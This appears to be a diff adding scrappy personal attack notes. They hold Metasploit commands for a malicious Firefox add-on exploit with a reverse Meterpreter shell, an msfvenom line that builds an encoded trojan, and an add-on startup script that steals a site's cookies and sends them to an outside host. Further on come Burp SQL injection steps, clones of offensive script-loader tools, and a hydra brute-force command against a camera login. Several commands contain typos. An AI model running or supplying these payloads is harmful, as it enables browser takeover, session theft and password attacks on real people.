@@ -1,0 +1,83 @@
+﻿firefox_xpi_bootstrapped_addon
+xp install signature required
+
+use exploit/multi/browser/firefox_xpi_bootstrapped_addon
+set payload windows/meterpreter/reverse_tcp_rc4
+set lhost 192.168.0.102
+set lport 4444
+set rc4password pepe
+set addonname addon_name
+set uripath addon
+run
+
+msfconsole -r addon_windows 
+
+msf exploit(firefox_xpi_bootstrapped_addon) > wget http://192.168.0.102:8080/addon/addon.xpi
+ 
+use exploit/multi/browser/firefoxxpibootstrapped_addon
+set addonname falso
+set SRVHOST 192.168.1.35
+set SRVPORT 80
+set URIPATH fakeEx
+set LHOST 192.168.1.35
+
+ruby\bin\ruby.exe msf3\msfvenom --payload windows/meterpreter/reversetcp --format exe --encoder x86/shikataganai --iterations 10 -e x86/countdown -i 3 -e x86/call4dwordxor -i 5 -e x86/jmpcall_additive -i 5 -f c LHOST=192.168.1.35 > trojan.exe
+
+set PAYLOADFILE d:\\metasploit4\\trojan.exe
+PAYLOADFILE => d:\metasploit4\trojan.exe
+payload => windows/meterpreter/reverse_tcp
+
+launched the exploit:
+
+xploit
+sessions -i
+
+addon_windows  addon.xpi
+
+unzip addon.xpi 
+Archive:  addon.xpi
+  inflating: bootstrap.js            
+  inflating: chrome.manifest         
+  inflating: install.rdf             
+  inflating: overlay.xul
+  
+/* Added MT */
+const {classes: Cc, interfaces: Ci, utils: Cu} = Components;
+const request = Cu.import('resource://gre/modules/Http.jsm').httpRequest;
+Components.utils.import("resource://gre/modules/Services.jsm");
+/* Added MT */
+ 
+function startup(data, reason) {
+ /* Added MT */
+ var cookieService = Services.cookies;
+ let cookieEnumerator = cookieService.getCookiesFromHost('xxxxx.com');
+ let cookiee = cookieEnumerator.getNext().QueryInterface(Ci.nsICookie2);
+ let totalcookies = '';
+ let options = {method: "GET"};
+ while (cookieEnumerator.hasMoreElements()) {
+  let cookiee = cookieEnumerator.getNext().QueryInterface(Ci.nsICookie2); 
+  let cookieall = "host=" + cookiee.host + "&" + cookiee.name + "=" + cookiee.value;
+  //Services.prompt.alert(null, "Title", cookieall);
+  httpRequest("http://192.168.0.100:4040/cookies.php?" + cookieall, options);
+ }
+ var expires = ((new Date()).getTime() / 1000) + 60 * 60 * 224; //today + 224hours
+ cookieService.add('192.168.0.101', '/', 'addoinst', 'yes', false, false, false, expires);
+ let cookie = 'status=OK2';
+ httpRequest("http://192.168.0.102:4040/status.php?" + cookie, options);
+ /* Added MT */
+
+new project, then go to the "Proxy" tab and ensure that "Intercept is on"
+Click on the "Action" button, then "Send to Intruder." 
+Next, go to the "Intruder" tab, and click on "Positions."
+Highlight the value entered for username, and click the "Add" button. We will use the "Sniper" attack
+SELECT username, password FROM users WHERE username='' or 1=1-- AND password='';
+Click on the "Payloads"
+navigate to /usr/share/wordlists/wfuzz/injection/SQL.txt
+Click the "Start attack" 
+going to the "Response" tab and clicking "Render."
+
+git clone https://github.com/tyranid/DotNetToJScript.git
+git clone https://github.com/mdsecactivebreach/CACTUSTORCH.git 
+git clone https://github.com/webpwnized/mutillidae.git
+
+hydra -s 80 -l admin -P /root/Desktop/wl/cctvpass.txt -e ns -t 16 targetIP http*
